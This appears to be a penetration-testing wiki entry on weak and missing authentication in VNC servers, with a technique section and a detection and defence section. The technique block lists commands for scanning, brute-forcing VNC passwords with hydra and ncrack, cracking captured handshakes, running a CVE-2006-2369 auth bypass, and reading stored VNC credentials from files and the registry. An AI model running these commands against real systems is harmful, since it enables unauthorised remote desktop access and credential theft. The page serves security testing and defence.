---
title: VNC Weak Auth and No-Auth Exposure
slug: vnc-attacks
---

> **TL;DR:** VNC's classic DES-based "VNC authentication" caps passwords at 8 characters and many builds (RealVNC, TightVNC, UltraVNC) ship with no-auth or known-password defaults — Shodan consistently finds hundreds of thousands of open desktops.

## What it is
The Remote Framebuffer protocol (RFB) underpins every VNC flavour. Security type 2 ("VNC Authentication") uses DES with a 64-bit key derived from the password, truncated to 8 characters — anything longer is silently ignored. Security type 1 is "None". Newer builds add TLS or RSA-AES but rely on the operator to turn them on; the standard install wizard offers no-auth as a valid choice.

## Preconditions / where it applies
- TCP/5900-5906 native, TCP/5800 Java applet viewer, TCP/5500 reverse connections
- RealVNC Free Edition historically defaulted to no-auth on Windows
- TightVNC, TigerVNC, UltraVNC inherit the 8-char DES limit on the legacy security type
- Found on POS terminals, KVM-over-IP appliances, industrial HMIs, helpdesk remote-support boxes, macOS Screen Sharing (ARD protocol over 5900)

## Technique
```bash
# Discover and grab the protocol banner
nmap -p 5900-5910 --script vnc-info,vnc-title,realvnc-auth-bypass 10.0.0.80
# RFB 003.008
#   Security types: 1 (None), 2 (VNC Auth)

# No-auth login — straight to the desktop
vncviewer 10.0.0.80:0

# Brute the 8-char DES password
hydra -P rockyou.txt -t 4 vnc://10.0.0.80
ncrack -p 5900 --user '' -P rockyou.txt 10.0.0.80

# Capture an existing handshake and crack offline
tshark -i eth0 -f 'tcp port 5900' -w vnc.pcap
# Extract challenge/response and feed to vncpwd / john --format=vnc

# RealVNC auth bypass (CVE-2006-2369) — server skips auth if client picks type 1
python3 realvnc_bypass.py 10.0.0.80 5900

# Read stored creds from a compromised host
vncpwd /root/.vnc/passwd                # fixed DES key
reg query 'HKLM\SOFTWARE\TightVNC\Server' /v Password
```

## Detection and defence
- Disable security type "None" and the legacy DES type; require TLS or RSA-AES (RealVNC Enterprise, TigerVNC `-SecurityTypes TLSVnc`)
- Front VNC with SSH or WireGuard — never expose 5900 directly
- Use SSO/MFA where the build supports it; rotate passwords beyond 8 chars only matters if the legacy type is off
- Detect: RFB ProtocolVersion exchange from external sources, repeated DES auth failures
- Patch: RealVNC >= 4.1.2 fixes the type-1 bypass (CVE-2006-2369); update KVM-over-IP firmware regularly

## References
- [RFC 6143 — RFB Protocol](https://www.rfc-editor.org/rfc/rfc6143) — documents the 8-char DES truncation
- [RealVNC CVE-2006-2369 advisory](https://www.realvnc.com/en/connect/docs/) — original bypass disclosure

See also: [[exposed-services]], [[port-scanning]], [[host-discovery]].
